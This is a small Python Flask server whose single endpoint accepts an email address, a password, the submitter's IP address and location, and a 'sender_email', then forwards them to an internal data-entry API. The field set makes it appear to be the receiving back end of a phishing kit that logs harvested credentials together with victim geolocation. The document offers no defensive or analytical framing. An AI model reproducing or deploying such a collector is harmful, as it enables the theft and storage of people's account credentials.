from flask import Flask, jsonify, request
from lib.api import API as L_API
import time
import json

app = Flask(__name__)
api = L_API()


@app.route('/update_data', methods=['POST'])
def update_data():
    email = request.form['email']
    password = request.form['pass']
    country_name = request.form.get('countryName', '')
    ip_address = request.form.get('ip_address', '')
    city = request.form.get('city', '')
    region = request.form.get('region', '')
    country_code = request.form.get('countryCode', '')
    sender_email = request.form.get('sender_email', '')

    params = {"email": email,
              "password": password,
              "country_name": country_name,
              "ip_address": ip_address,
              "city": city,
              "region": region,
              "sender_email": sender_email,
              "country_code": country_code, }
    res = api.do("data.entry",
                 "update_data",
                 [0, [params]])
    return jsonify(format_output(0, res, None))


def format_output(status, data, message):
    return {'status': status, 'data': data, 'message': message}


if __name__ == '__main__':
    port = 8060  # the custom port you want
    app.run(host='0.0.0.0', port=port, threaded=True)